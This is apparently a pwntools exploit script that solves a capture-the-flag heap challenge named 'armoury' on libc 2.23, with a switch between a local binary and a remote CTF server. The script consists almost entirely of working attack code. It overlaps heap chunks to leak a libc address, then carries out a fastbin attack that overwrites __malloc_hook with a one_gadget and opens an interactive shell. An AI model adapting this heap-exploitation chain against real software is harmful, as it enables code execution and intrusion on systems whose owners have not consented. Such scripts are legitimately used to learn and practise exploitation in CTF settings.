from pwn import *

# https://devel0pment.de/?p=688

elf = ELF("./armoury_patched")
libc = ELF("./libc-2.23.so")
one_gadgets = [0x45226, 0x4527a, 0xf03a4, 0xf1247]

context.update(binary=elf)

if args.REMOTE:
    host = 'gc1.eng.run'
    port = 32325
    p = remote(host, port)
else:
    p = elf.process()

def malloc(payload, pad=0):
    payload += b'A' * (pad - len(payload))
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(len(payload)).encode())
    p.sendafter(b'Items: ', payload)
    idx = int(p.recvline()[6:-1])
    return idx

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def view(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.recvline()
    r = p.recvuntil(b'\n1) ')[:-4]
    return r


c1 = malloc(b'A' * 0xf0)
c2 = malloc(b'B' * 0x60)
c3 = malloc(b'C' * 0xf0)
c4 = malloc(b'D' * 0x10)
free(c1)
free(c2)
c2 = malloc(b'B' * 0x60 + p64(0x170))
free(c3)
c1 = malloc(b'A' * 0xf0)

leak = u64(view(c2).ljust(8, b'\x00'))
libc.address = leak - 0x3c4b78
one_gadget = libc.address + one_gadgets[2]
malloc_hook = libc.symbols['__malloc_hook'] - 0x30 + 0xd

log.info(f'Libc base: {hex(libc.address)}')
log.info(f'One gadget: {hex(one_gadget)}')
log.info(f'Malloc hook: {hex(libc.symbols["__malloc_hook"])}')

free(c1)
c1 = malloc(b'A' * 0xf0 + p64(0x110) + p64(0x71))

free(c2)

free(c1)
c1 = malloc(b'A' * 0xf0 + p64(0x120) + p64(0x71) + p64(malloc_hook))

c2 = malloc(b'B' * 0x60)
c2_ = malloc(b'\x00' * 19 + p64(one_gadget) + b'\x00' * (0x60 - 27))

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Size: ', b'16')

p.interactive()
p.close()